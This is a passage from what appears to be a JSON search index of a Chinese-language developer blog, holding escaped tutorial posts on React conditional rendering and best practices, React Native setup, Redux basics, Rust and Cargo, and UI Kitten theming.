Display\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}\r};\r2. \u0026amp;\u0026amp; class MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rdisplay: true\r}\rthis.toggleDisplay = this.toggleDisplay.bind(this);\r}\rtoggleDisplay() {\rthis.setState(state =\u0026gt; ({\rdisplay: !state.display\r}));\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleDisplay}\u0026gt;Toggle Display\u0026lt;/button\u0026gt;\r{this.state.display \u0026amp;\u0026amp; \u0026lt;h1\u0026gt;Displayed!\u0026lt;/h1\u0026gt;}\r\u0026lt;/div\u0026gt;\r);\r}\r};\r3. 三元表达式 const inputStyle = {\rwidth: 235,\rmargin: 5\r}\rclass CheckUserAge extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\ruserAge: '',\rinput: ''\r}\rthis.submit = this.submit.bind(this);\rthis.handleChange = this.handleChange.bind(this);\r}\rhandleChange(e) {\rthis.setState({\rinput: e.target.value,\ruserAge: ''\r});\r}\rsubmit() {\rthis.setState(state =\u0026gt; ({\ruserAge: state.input\r}));\r}\rrender() {\rconst buttonOne = \u0026lt;button onClick={this.submit}\u0026gt;Submit\u0026lt;/button\u0026gt;;\rconst buttonTwo = \u0026lt;button\u0026gt;You May Enter\u0026lt;/button\u0026gt;;\rconst buttonThree = \u0026lt;button\u0026gt;You Shall Not Pass\u0026lt;/button\u0026gt;;\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;Enter Your Age to Continue\u0026lt;/h3\u0026gt;\r\u0026lt;input\rstyle={inputStyle}\rtype=\u0026quot;number\u0026quot;\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\u0026lt;br /\u0026gt;\r{\rthis.state.userAge === ''\r? buttonOne\r: this.state.userAge \u0026gt;= 18\r? buttonTwo\r: buttonThree\r}\r\u0026lt;/div\u0026gt;\r);\r}\r};\r4. 根据props有条件地渲染 class Results extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;h1\u0026gt;\r{this.props.fiftyFifty ? \u0026quot;You Win!\u0026quot; : \u0026quot;You Lose!\u0026quot;}\r\u0026lt;/h1\u0026gt;\r)\r};\r};\rclass GameOfChance extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rcounter: 1\r}\rthis.handleClick = this.handleClick.bind(this);\r}\rhandleClick() {\rthis.setState({\rcounter: this.state.counter + 1\r});\r}\rrender() {\rconst expression = Math.random() \u0026gt;= 0.5 ? true : false\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.handleClick}\u0026gt;Play Again\u0026lt;/button\u0026gt;\r\u0026lt;Results fiftyFifty={expression} /\u0026gt;\r\u0026lt;p\u0026gt;{'Turn: ' + this.state.counter}\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r5. 根据state有条件地渲染 class GateKeeper extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: ''\r};\rthis.handleChange = this.handleChange.bind(this);\r}\rhandleChange(event) {\rthis.setState({ input: event.target.value })\r}\rrender() {\rlet inputStyle = {\rborder: '1px solid black'\r};\rif (this.state.input.length \u0026gt; 15) {\rinputStyle.border = '3px solid red';\r}\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;Don't Type Too Much:\u0026lt;/h3\u0026gt;\r\u0026lt;input\rtype=\u0026quot;text\u0026quot;\rstyle={inputStyle}\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r十、Array.map()渲染数组 const frontEndFrameworks = [\r'React',\r'Angular',\r'Ember',\r'Knockout',\r'Backbone',\r'Vue'\r];\rfunction Frameworks() {\rconst renderFrameworks = frontEndFrameworks.map((item, index) =\u0026gt;\r\u0026lt;li key={index}\u0026gt;{item}\u0026lt;/li\u0026gt;\r);\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Popular Front End JavaScript Frameworks\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;\r{renderFrameworks}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r};\r十一、Array.Filter() 动态过滤数组 class MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rusers: [\r{\rusername: 'Jeff',\ronline: true\r},\r{\rusername: 'Alan',\ronline: false\r},\r{\rusername: 'Mary',\ronline: true\r},\r{\rusername: 'Jim',\ronline: false\r},\r{\rusername: 'Sara',\ronline: true\r},\r{\rusername: 'Laura',\ronline: true\r}\r]\r}\r}\rrender() {\rconst usersOnline = this.state.users.filter(user =\u0026gt; user.online === true);\rconst renderOnline = usersOnline.map(user =\u0026gt; \u0026lt;li key={user.username}\u0026gt;{user.username}\u0026lt;/li\u0026gt;);\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Current Online Users:\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;\r{renderOnline}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r十二、用 renderToString 在服务器上渲染 React 有两个关键原因可以解释为什么服务器上的渲染可能会在真实世界的应用程序中使用。\n首先，如果不这样做，当 React 应用程序最初加载到浏览器时，它将包含一个代码量很少的 HTML 文件和一大堆 JavaScript。 这对于搜索引擎来说可能不太理想，因为它们试图为网页内容生成索引，以便人们可以找到这个应用。 如果在服务器上渲染初始 HTML 标记并将其发送到客户端，则初始页面加载的内容包含搜索引擎可以抓取的所有页面标记。\n其次，这创造了更快的初始页面加载体验，因为渲染的 HTML 代码量要比整个应用程序的 JavaScript 代码小。 React 仍然能够识别你的应用并在初始加载后进行管理。\nclass App extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn \u0026lt;div/\u0026gt;\r}\r};\rReactDOMServer.renderToString(\u0026lt;App /\u0026gt;);\r","description":"React 的基础内容，不再会在项目中使用class组件","id":21,"section":"react","tags":null,"title":"React 基础","uri":"https://danacoding.github.io/react/react/react-base/"},{"content":"React 是一个声明式、高效且灵活的 JavaScript 库\n一、特性   虚拟 DOM：保存在内存中并通过 ReactDOM 等库与“真实”DOM 同步的 UI 表示。使用这种方法，只有实际更改的组件才会更新到 DOM，而不是所有组件。\n  声明式：声明式视图使代码更可预测和易于调试。\n  基于 CDD 开发模式\n  跨平台 React-Native\n  区别于命令式，这里拿 for 举例\n1 2 3 4 5 6 7 8 9 10  //命令式，我称之为松散式 let n = [-9, 87, 72, 452, 32, -9]; for (let i = 0; i \u0026lt; n.length; i++) { console.log(n[i]); } //声明式（函数式，封装性更好） let n = [-9, 87, 72, 452, 32, -9]; n.forEach((v) =\u0026gt; console.log(v));   二、目录结构 拿 nextjs 举例\n pages  index.tsx   components  button.component.tsx   public  favicon.ico   styles  global.module.css    三、Hooks  Hooks 让你无需编写类即可使用状态和其他 React 功能。 不适用于基于类的组件。  #. 调用 Hooks  不要在循环、条件或嵌套函数中调用 Hook。此外，永远不要从常规 JavaScript 函数调用 Hook。它们应该从 React 功能组件的顶层中调用。  #. 使用 ESLint 插件 可以使用 eslint-plugin-react-hooks 强制从 React 功能组件中和自定义 Hook 中调用 Hook。\n1 2  yarn add --dev eslint-plugin-react-hooks   1 2 3 4 5 6 7 8 9 10 11 12 13  //ESLint 配置 { \u0026#34;plugins\u0026#34;: [ // ...  \u0026#34;react-hooks\u0026#34; ], \u0026#34;rules\u0026#34;: { // ...  \u0026#34;react-hooks/rules-of-hooks\u0026#34;: \u0026#34;error\u0026#34;, // 检查 Hooks 的规则  \u0026#34;react-hooks/exhaustive-deps\u0026#34;: \u0026#34;warn\u0026#34; // 检查 effect 依赖  } }   三、表单验证  react-hook-form Formik kendo-react-form  四、JSX 速记  当使用 props 控制组件可见性时  1 2 3 4  showRatings={true} \u0026lt;Reviews showRatings /\u0026gt;   五、类型检查  使用 React.PropTypes  1 2 3 4 5 6 7 8 9  const MyComponent = (props) =\u0026gt; { const { username } = props; return \u0026lt;div\u0026gt;{props.name}\u0026lt;/div\u0026gt;; }; PropTypeMyComponent.PropTypes = { name: PropTypes.string.isRequired, };    使用 TypeScript (首推)  1 2 3 4 5 6 7 8  interface props { username?: string; } const Mycomponent = ({ username }: props) =\u0026gt; { return \u0026lt;div\u0026gt;{username}\u0026lt;/div\u0026gt;; };   六、使用 Memo 提升性能 React.Memo 高阶组件环绕组件以记住渲染的输出并跳过不必要的渲染。\n1 2 3 4  const ChildrenComponent = React.memo(({userName}) =\u0026gt; { return \u0026lt;div\u0026gt;{userName}\u0026lt;/div\u0026gt; })   七、使用 Fragments / \u0026lt;\u0026gt;\u0026lt;/\u0026gt; React 中的一个常见模式是一个组件返回多个元素。\nFragments 允许你将子列表分组，而无需向 DOM 添加额外节点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  return ( \u0026lt;React.Fragment\u0026gt; \u0026lt;ChildA /\u0026gt; \u0026lt;ChildB /\u0026gt; \u0026lt;ChildC /\u0026gt; \u0026lt;/React.Fragment\u0026gt; ); // or 短语法  return ( \u0026lt;\u0026gt; \u0026lt;ChildA /\u0026gt; \u0026lt;ChildB /\u0026gt; \u0026lt;ChildC /\u0026gt; \u0026lt;/\u0026gt; )   ","description":"会时常更新，因为React的发展很快且社区很庞大","id":22,"section":"react","tags":null,"title":"React 最佳实践","uri":"https://danacoding.github.io/react/react/react-bp/"},{"content":"开发平台：Windows\n目标平台：Android\nReactNative 版本：0.62.2\n一、安装依赖  Node (\u0026gt;=12) Python2 (Windows x86 MSI installer) Java SE Development Kit (JDK) (1.8 版本) 注意：要最新版本，要时常更新 Yarn (下载比 npm 快)  npm install -g yarn\rAndroid Studio (只用依赖，不要用来设置设备，因为非常吃计算机系统盘容量和性能)  //1. 安装界面中选择\u0026quot;Custom\u0026quot;选项，确保选中了以下几项：\rAndroid SDK\rAndroid SDK Platform\r//然后点击\u0026quot;Next\u0026quot;来安装选中的组件。\r//2. 欢迎界面中点击\u0026quot;Configure\u0026quot;，在 SDK Manager 中。\r// 1). 选择\u0026quot;SDK Platforms\u0026quot;选项卡，然后在右下角勾选\u0026quot;Show Package Details\u0026quot;。\r// 展开Android 9 (pie)选项，确保勾选了下面这些组件：\rAndroid SDK Platform 28\r// 2). 选择\u0026quot;SDK Tools\u0026quot;选项卡，同样勾中右下角的\u0026quot;Show Package Details\u0026quot;。\r// 展开\u0026quot;Android SDK Build-Tools\u0026quot;选项，确保选中了 React Native 所必须的：\r28.0.3 （版本）\r// 3). 最后点击\u0026quot;Apply\u0026quot;来下载和安装这些组件。\r配置环境变量  //1. 创建ANDROID_HOME环境变量（系统或用户变量均可）\rANDROID_HOME\rC:\\Users\\Administrator\\AppData\\Local\\Android\\Sdk\r//2. 环境变量 Path 中添加以下工具目录\r%ANDROID_HOME%\\platform-tools\r%ANDROID_HOME%\\emulator\r%ANDROID_HOME%\\tools\r%ANDROID_HOME%\\tools\\bin\r二、安装模拟器 //模拟器是基于虚拟机运行，所以运行性能良好\rGenymotion 模拟器 //平常只开启这个就可以了，不用手动去启动VirtualBox虚拟机;可以点击debug用Chrome浏览器做调试也可以。\rVirtualBox 虚拟机\r//两者都安装好以后，创建安卓设备，如果遇到打开不了设备，则Genymotion恢复出厂设置/重启电脑，多试几次，才能正常打开设备\r//留意电脑是否开启了支持虚拟设备，如果没有则去到Bios设置开启\r三、创建项目并编译 //1.创建项目\rnpx react-native init MyApp --template react-native-template-typescript\r//2.安装依赖\ryarn install\r//3.启动 Metro Bundle(Metro是RN的打包工具)\ryarn start\r//4.将在模拟器或任何连接的 android 设备上构建并打开应用。\ryarn android //或者 yarn react-native run-android\r","description":"","id":23,"section":"react-native","tags":null,"title":"React-Native 基础","uri":"https://danacoding.github.io/react-native/react-native/rn-base/"},{"content":"Redux 是一个状态管理框架，可以与包括 React 在内的许多不同的 Web 技术一起使用。\n在 Redux 中，有一个状态对象负责应用程序的整个状态，\n这意味着如果你有一个包含十个组件且每个组件都有自己的本地状态的 React 项目，那么这个项目的整个状态将通过 Redux store 被定义为单个状态对象，\n这是 Redux 的第一个重要原则：Redux store 是应用程序状态的唯一真实来源。\n这也意味着，如果应用程序想要更新状态，只能通过 Redux store 执行， 单向数据流可以更轻松地对应用程序中的状态进行监测管理。\n一、创建一个 Redux Store const reducer = (state = 5) =\u0026gt; {\rreturn state;\r}\r// 可从 Redux 对象获得 Redux 方法\r// 例如：Redux.createStore()\rconst store = Redux.createStore(reducer)\r二、从 Redux Store 获取状态 const reducer = (state = 5) =\u0026gt; {\rreturn state;\r}\rconst store = Redux.createStore(reducer)\rconst currentState = store.getState()\r三、action 由于 Redux 是一个状态管理框架，因此更新状态是其核心任务之一。\n在 Redux 中，所有状态更新都由 dispatch action 触发，\naction 只是一个 JavaScript 对象，其中包含有关已发生的 action 事件的信息。\nRedux store 接收这些 action 对象，然后更新相应的状态。\n有时，Redux action 也会携带一些数据。 例如，在用户登录后携带用户名， 虽然数据是可选的，但 action 必须带有 type 属性，该属性表示此 action 的类型。\n可以将 Redux action 视为信使，将有关应用程序中发生的事件信息提供给 Redux store， 然后 store 根据发生的 action 进行状态的更新。\n1. 定义一个 Redux Action const action = {\rtype: 'LOGIN'\r}\r2. 定义一个 Action Creator 创建 action 后要将 action 发送到 Redux store，以便它可以更新其状态。\n在 Redux 中，可以定义动作创建器来完成此任务， action creator 只是一个返回动作的 JavaScript 函数。\n换句话说，action creator 创建表示动作事件的对象。\nconst action = {\rtype: 'LOGIN'\r}\rconst actionCreator = () =\u0026gt; action\r3. 分发 Action Event dispatch 方法用于将 action 分派给 Redux store，\n调用 store.dispatch() 将从 action creator 返回的值发送回 store。\n动作创建者返回一个具有 type 属性的对象，该属性指定已发生的动作。 然后该方法会将一个 action 对象发送到 Redux store。\nconst store = Redux.createStore(\r(state = { login: false }) =\u0026gt; state\r);\rconst loginAction = () =\u0026gt; {\rreturn {\rtype: 'LOGIN'\r}\r};\rstore.dispatch(loginAction())\r4. 在 Store 里处理 Action 在一个 action 被创建并 dispatch 之后，Redux store 需要知道如何响应该操作。 这就是 reducer 函数存在的意义。\nRedux 中的 Reducers 负责响应 action 然后进行状态的修改。\nreducer 将 state 和 action 作为参数，并且它总是返回一个新的 state。 这是 reducer 的唯一的作用。\n它不应有任何其他的作用：比如它不应调用 API 接口，也不应存在任何潜在的副作用。\nreducer 只是一个接受状态和动作，然后返回新状态的纯函数。\nRedux 的另一个关键原则是 state 是只读的。 换句话说，reducer 函数必须始终返回一个新的 state，并且永远不会直接修改状态。\nRedux 不强制改变状态，但是需要在 reducer 函数的代码中强制执行它。\nconst defaultState = {\rlogin: false\r};\rconst reducer = (state = defaultState, action) =\u0026gt; {\rif (action.type == 'LOGIN') {\rreturn { login: true }\r} else {\rreturn state\r}\r};\rconst store = Redux.createStore(reducer);\rconst loginAction = () =\u0026gt; {\rreturn {\rtype: 'LOGIN'\r}\r};\r5. 使用 Switch 语句处理多个 Actions 可以定义 Redux store 处理多种 action 类型。\n假设在 Redux store 中管理用户身份验证。 希望用状态表示用户登录和注销。 使用 state 的 authenticated 属性表示它。\n还需要使用 action creators 创建与用户登录和用户注销相对应的 action，以及 action 对象本身。\nconst defaultState = {\rauthenticated: false\r};\rconst authReducer = (state = defaultState, action) =\u0026gt; {\rswitch (action.type) {\rcase 'LOGIN':\rreturn { authenticated: true }\rcase 'LOGOUT':\rreturn { authenticated: false };\rdefault:\rreturn state\r}\r};\rconst store = Redux.createStore(authReducer);\rconst loginUser = () =\u0026gt; {\rreturn {\rtype: 'LOGIN'\r}\r};\rconst logoutUser = () =\u0026gt; {\rreturn {\rtype: 'LOGOUT'\r}\r};\r6. 使用 const 声明 Action Types 在使用 Redux 时的一个常见做法是将操作类型指定为只读，然后在任何使用它们的地方引用这些常量。\n可以通过将 action types 使用 const 声明重构你正在使用的代码。\nconst LOGIN = 'LOGIN';\rconst LOGOUT = 'LOGOUT';\rconst loginUser = () =\u0026gt; {\rreturn {\rtype: LOGIN\r}\r};\rconst logoutUser = () =\u0026gt; {\rreturn {\rtype: LOGOUT\r}\r};\rconst defaultState = {\rauthenticated: false\r};\rconst authReducer = (state = defaultState, action) =\u0026gt; {\rswitch (action.type) {\rcase LOGIN:\rreturn {\rauthenticated: true\r}\rcase LOGOUT:\rreturn {\rauthenticated: false\r}\rdefault:\rreturn state;\r}\r};\rconst store = Redux.createStore(authReducer);\r四、注册 Store 监听器 在 Redux store 对象上访问数据的另一种方法是 store.subscribe()。\n这允许将监听器函数订阅到 store，只要 action 被 dispatch 就会调用它们。\n这个方法的一个简单用途是为 store 订阅一个函数，它只是在每次收到一个 action 并且更新 store 时记录一条消息。\nconst ADD = 'ADD';\rconst reducer = (state = 0, action) =\u0026gt; {\rswitch (action.type) {\rcase ADD:\rreturn state + 1;\rdefault:\rreturn state;\r}\r};\rconst store = Redux.createStore(reducer);\r// 全局 count 变量：\rlet count = 0;\r// 修改这行下面的代码\rfunction sayHi() {\rcount += 1\r}\rstore.subscribe(sayHi)\r// 修改这行上面的代码\rstore.dispatch({ type: ADD });\rconsole.log(count);\rstore.dispatch({ type: ADD });\rconsole.log(count);\rstore.dispatch({ type: ADD });\rconsole.log(count);\r五、组合多个 Reducers 当应用程序的状态开始变得越来越复杂时，可能会将 state 分成多个块。\n相反，请记住 Redux 的第一个原则：所有应用程序状态都保存在 store 中的一个简单的 state 对象中。\n因此，Redux 提供 reducer 组合作为复杂状态模型的解决方案。\n定义多个 reducer 来处理应用程序状态的不同部分，然后将这些 reducer 组合成一个 root reducer。\n然后将 root reducer 传递给 Redux createStore()方法。\n为了将多个 reducer 组合在一起，Redux 提供了combineReducers()方法。\n该方法接受一个对象作为参数，在该参数中定义一个属性，该属性将键与特定 reducer 函数关联。\nRedux 将使用给定的键值作为关联状态的名称。\n通常情况下，当它们在某种程度上是独一无二的，为每个应用程序的 state 创建一个 reducer 是一个很好的做法。\n例如，在一个带有用户身份验证的记笔记应用程序中，一个 reducer 可以处理身份验证而另一个处理用户提交的文本和注释。\nconst INCREMENT = 'INCREMENT';\rconst DECREMENT = 'DECREMENT';\rconst counterReducer = (state = 0, action) =\u0026gt; {\rswitch (action.type) {\rcase INCREMENT:\rreturn state + 1;\rcase DECREMENT:\rreturn state - 1;\rdefault:\rreturn state;\r}\r};\rconst LOGIN = 'LOGIN';\rconst LOGOUT = 'LOGOUT';\rconst authReducer = (state = { authenticated: false }, action) =\u0026gt; {\rswitch (action.type) {\rcase LOGIN:\rreturn {\rauthenticated: true\r}\rcase LOGOUT:\rreturn {\rauthenticated: false\r}\rdefault:\rreturn state;\r}\r};\rconst rootReducer = Redux.combineReducers({\rauth: authReducer,\rcount: counterReducer\r})\rconst store = Redux.createStore(rootReducer);\r六、发送 Action Data 给 Store action 还可以包含除 type之外的任何信息。 还可以和 action 一起发送特定数据。\n事实上，这是非常常见的，因为 action 通常源于一些用户交互，并且往往会携带一些数据， Redux store 经常需要知道这些数据。\nconst ADD_NOTE = \u0026quot;ADD_NOTE\u0026quot;;\rconst notesReducer = (state = \u0026quot;Initial State\u0026quot;, action) =\u0026gt; {\rswitch (action.type) {\rcase ADD_NOTE:\rreturn action.text;\rdefault:\rreturn state;\r}\r};\rconst addNoteText = note =\u0026gt; {\rreturn {\rtype: ADD_NOTE,\rtext: note\r};\r};\rconst store = Redux.createStore(notesReducer);\rconsole.log(store.getState());\rstore.dispatch(addNoteText(\u0026quot;Hello!\u0026quot;));\rconsole.log(store.getState());\r七、使用中间件处理异步操作 在某些时候，需要在 Redux 应用程序中使用异步请求，那么如何处理这些类型的请求？\nRedux 中间件专为此目的而设计，称为 Redux Thunk 中间件。\nconst REQUESTING_DATA = 'REQUESTING_DATA'\rconst RECEIVED_DATA = 'RECEIVED_DATA'\rconst requestingData = () =\u0026gt; { return { type: REQUESTING_DATA } }\rconst receivedData = (data) =\u0026gt; { return { type: RECEIVED_DATA, users: data.users } }\rconst handleAsync = () =\u0026gt; {\rreturn function (dispatch) {\r// 在这里发送 request action\rdispatch(requestingData());\rsetTimeout(function () {\rlet data = {\rusers: ['Jeff', 'William', 'Alice']\r}\r// 在这里发送接收到的 data action\rdispatch(receivedData(data));\r}, 2500);\r}\r};\rconst defaultState = {\rfetching: false,\rusers: []\r};\rconst asyncDataReducer = (state = defaultState, action) =\u0026gt; {\rswitch (action.type) {\rcase REQUESTING_DATA:\rreturn {\rfetching: true,\rusers: []\r}\rcase RECEIVED_DATA:\rreturn {\rfetching: false,\rusers: action.users\r}\rdefault:\rreturn state;\r}\r};\rconst store = Redux.createStore(\rasyncDataReducer,\rRedux.applyMiddleware(ReduxThunk.default)\r);\r八、案例 1. 用 Redux 写一个计数器 // 为 increment action types 定义一个常量\rconst INCREMENT = \u0026quot;INCREMENT\u0026quot;;\r// 为 decrement action types 定义一个常量\rconst DECREMENT = \u0026quot;DECREMENT\u0026quot;;\r// 定义 counter reducer，根据接收到的动作递增或递减 state\rconst counterReducer = (state = 0, action) =\u0026gt; {\rswitch (action.type) {\rcase INCREMENT:\rreturn state + 1;\rcase DECREMENT:\rreturn state - 1;\rdefault:\rreturn state;\r}\r};\r// 为自增运算定义一个动作创建器\rconst incAction = () =\u0026gt; {\rreturn {\rtype: INCREMENT\r};\r};\r// 为自减运算定义一个动作创建器\rconst decAction = () =\u0026gt; {\rreturn {\rtype: DECREMENT\r};\r};\r// 在这里定义 Redux store，传入 reducers\rconst store = Redux.createStore(counterReducer);\r2. 永不改变状态 不可变状态意味着永远不直接修改状态，而是返回一个新的状态副本。\nconst ADD_TO_DO = 'ADD_TO_DO';\r// 一个展示需要完成的任务的字符串列表：\rconst todos = [\r'Go to the store',\r'Clean the house',\r'Cook dinner',\r'Learn to code',\r];\rconst immutableReducer = (state = todos, action) =\u0026gt; {\rswitch (action.type) {\rcase ADD_TO_DO:\r// 这里不能修改 state\rreturn state.concat(action.todo);\rdefault:\rreturn state;\r}\r};\rconst addToDo = (todo) =\u0026gt; {\rreturn {\rtype: ADD_TO_DO,\rtodo\r}\r}\rconst store = Redux.createStore(immutableReducer);\r3. 在数组中使用扩展运算符 ES6 中有助于在 Redux 中强制执行状态不变性的一个解决方案是扩展运算符：\u0026hellip;。 扩展运算符具有很多的应用，其中一种非常适合通过一个已有的数组生成一个新数组。\nconst immutableReducer = (state = ['Do not mutate state!'], action) =\u0026gt; {\rswitch (action.type) {\rcase 'ADD_TO_DO':\r// 这里不能修改 state\rlet arr = [...state, action.todo];\rreturn arr;\rdefault:\rreturn state;\r}\r};\rconst addToDo = (todo) =\u0026gt; {\rreturn {\rtype: 'ADD_TO_DO',\rtodo\r}\r}\rconst store = Redux.createStore(immutableReducer);\r4. 从数组中删除项目 扩展运算符也可以在这里使用。 其他有用的JavaScript方法包括 slice() 和 concat()。\nconst immutableReducer = (state = [0, 1, 2, 3, 4, 5], action) =\u0026gt; {\rswitch (action.type) {\rcase 'REMOVE_ITEM':\r// 这里不能修改 state\rreturn [\r...state.slice(0, action.index),\r...state.slice(action.index + 1, state.length)\r];\r// or return state.slice(0, action.index).concat(state.slice(action.index + 1, state.length));\rdefault:\rreturn state;\r}\r};\rconst removeItem = (index) =\u0026gt; {\rreturn {\rtype: 'REMOVE_ITEM',\rindex\r}\r}\rconst store = Redux.createStore(immutableReducer);\r5. 使用 Object.assign 拷贝对象 当状态是 object 时，有一些方法可以实现状态不变性。\n处理对象的一个常用的方法是 Object.assign()。\nObject.assign() 获取目标对象和源对象，并将源对象中的属性映射到目标对象。 任何匹配的属性都会被源对象中的属性覆盖。\n通常用于通过传递一个空对象作为第一个参数，然后是要用复制的对象来制作对象的浅表副本。\nconst defaultState = {\ruser: 'CamperBot',\rstatus: 'offline',\rfriends: '732,982',\rcommunity: 'freeCodeCamp'\r};\rconst immutableReducer = (state = defaultState, action) =\u0026gt; {\rswitch (action.type) {\rcase 'ONLINE':\r// 这里不能修改 state\rreturn Object.assign({}, state, { status: \u0026quot;online\u0026quot; });\rdefault:\rreturn state;\r}\r};\rconst wakeUp = () =\u0026gt; {\rreturn {\rtype: 'ONLINE'\r}\r};\rconst store = Redux.createStore(immutableReducer);\r","description":"Redux 是一个状态管理框架，可以与包括 React 在内的许多不同的 Web 技术一起使用。我个人感觉思路是好的，但是使用的方式非常的落后且沉重。","id":24,"section":"react","tags":null,"title":"Redux","uri":"https://danacoding.github.io/react/redux/redux-base/"},{"content":"高级人体工程学和低级控制在编程语言设计中往往是不一致的；Rust 挑战了这种冲突。 一、安装 下载安装器，然后运行该程序并遵循屏幕上的指示。\n二、获取最新的 Rust rustup update\r三、Cargo: Rust 的构建工具和包管理器 在安装 Rustup 时，也会安装 Rust 构建工具和包管理器的最新稳定版，即 Cargo。\n1 2 3 4 5 6 7 8 9  cargo--version//检查 Rust 版本 cargonewhello-rust//创建新项目 cargobuild//构建项目 cargorun//运行项目 cargotest//测试项目 cargodoc//为项目构建文档 cargopublish//可以将库发布到 crates.io   四、创建新项目 cargo new hello-rust\rhello-rust\r|- Cargo.toml //为 Rust 的清单文件。其中包含了项目的元数据和依赖库。\r|- src |- main.rs //编写应用代码的地方。\rcargo run\r五、添加依赖 可以在crates.io，即 Rust 包的仓库中找到所有类别的库。\n在 Rust 中，把包称作“crates”。\n举例：使用名为 ferris-says\n添加 //在 `Cargo.toml` 文件中添加以下信息（从 crates.io 页面上获取）\r[dependencies]\rferris-says = \u0026quot;0.2\u0026quot;\rcargo build\r…之后 Cargo 就会安装该依赖。\n运行此命令会创建一个新文件 Cargo.lock，该文件记录了本地所用依赖库的精确版本。\n使用 //main.rs\ruse ferris_says::say;\r这样就可以使用 ferris-says crate 中导出的 say 函数了。\n六、编写一个小应用 main.rs\nuse ferris_says::say;\ruse std::io::{ stdout, BufWriter };\rfn main() {\rlet out = b\u0026quot;Hello fellow Rustaceans!\u0026quot;;\rlet width = 24;\rlet mut writer = BufWriter::new(stdout());\rsay(out, width, \u0026amp;mut writer).unwrap();\r}\rcargo run\r----------------------------\r\u0026lt; Hello fellow Rustaceans! \u0026gt;\r----------------------------\r\\\r\\\r_~^~^~_\r\\) / o o \\ (/\r'_ - _'\r/ '-----' \\\r","description":"构建可靠且高效软件能力的语言","id":25,"section":"rust","tags":null,"title":"Rust","uri":"https://danacoding.github.io/rust/rust-base/"},{"content":"一、安装 //确保已安装 React Native CLI\rnpm un -g react-native-cli \u0026amp;\u0026amp; npm i -g @react-native-community/cli\r//用 Kitten 模板创建新项目\rnpx react-native init MyApp --template @ui-kitten/template-js\r//启动应用\ryarn android\r二、配置路由（配置应用程序在屏幕之间导航，基于 React Navigation） 1.安装\n//核心库\ryarn add react-navigation\r//导航器使用的依赖项\ryarn add react-native-reanimated react-native-gesture-handler react-native-screens react-native-safe-area-context @react-native-community/masked-view\r2.要完成react-native-gesture-handlerAndroid的安装，请对MainActivity.java进行以下修改\npackage com.reactnavigation.example;\rimport com.facebook.react.ReactActivity;\r+ import com.facebook.react.ReactActivityDelegate;\r+ import com.facebook.react.ReactRootView;\r+ import com.swmansion.gesturehandler.react.RNGestureHandlerEnabledRootView;\rpublic class MainActivity extends ReactActivity {\r@Override\rprotected String getMainComponentName() {\rreturn \u0026quot;Example\u0026quot;;\r}\r+ @Override\r+ protected ReactActivityDelegate createReactActivityDelegate() {\r+ return new ReactActivityDelegate(this, getMainComponentName()) {\r+ @Override\r+ protected ReactRootView createRootView() {\r+ return new RNGestureHandlerEnabledRootView(MainActivity.this);\r+ }\r+ };\r+ }\r}\r3.然后将以下内容添加到条目文件的顶部，例如index.js或App.js\nimport 'react-native-gesture-handler';\r 注意：使用导航器（例如 stack navigator 堆栈导航器）时，需要按照该导航器的安装说明进行操作，以获取任何其他依赖项。 如果遇到错误“无法解析模块”，则需要在项目中安装该模块。\n 三、主题工具 Eva Colors 四、配置主题  创建主题 context  //创建 theme-context.js 文件并粘贴以下代码\rimport React from 'react';\rexport const ThemeContext = React.createContext({\rtheme: 'light',\rtoggleTheme: () =\u0026gt; {},\r});\r//就React而言，context提供了一种通过组件树传递数据的方法，而不必在每个级别手动传递道具。\r//使用上面的代码，我们创建一个ThemeContext通过组件树提供有关当前主题的信息，因此任何组件都可以使用它。主题上下文的当前值为：\r//theme-确定当前主题的名称。\r//toggleTheme -可以切换当前主题的function。\r注册主题  //打开 App.js 并粘贴下面的代码\rimport React from 'react';\rimport * as eva from '@eva-design/eva';\rimport { ApplicationProvider, IconRegistry } from '@ui-kitten/components';\rimport { EvaIconsPack } from '@ui-kitten/eva-icons';\rimport { AppNavigator } from './navigation.component';\rimport { ThemeContext } from './theme-context'; //导入ThemeContext\rexport default () =\u0026gt; {\r//创建{ theme, toggleTheme }，此对象成为了主题context，使用useState函数创建一个应用程序状态，以保存当前主题的名称\rconst [theme, setTheme] = React.useState('light');\r//切换当前主题function\rconst toggleTheme = () =\u0026gt; {\rconst nextTheme = theme === 'light' ? 'dark' : 'light';\rsetTheme(nextTheme);\r};\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;IconRegistry icons={EvaIconsPack}/\u0026gt;\r\u0026lt;ThemeContext.Provider value={{ theme, toggleTheme }}\u0026gt;\r\u0026lt;ApplicationProvider {...eva} theme={eva[theme]}\u0026gt;\r\u0026lt;AppNavigator/\u0026gt;\r\u0026lt;/ApplicationProvider\u0026gt;\r\u0026lt;/ThemeContext.Provider\u0026gt;\r\u0026lt;/\u0026gt;\r);\r};\r用法  //在 home.component.js 中通过按下按钮进行修改以切换主题\rimport React from 'react';\rimport { SafeAreaView } from 'react-native';\rimport { Button, Layout } from '@ui-kitten/components';\rimport { ThemeContext 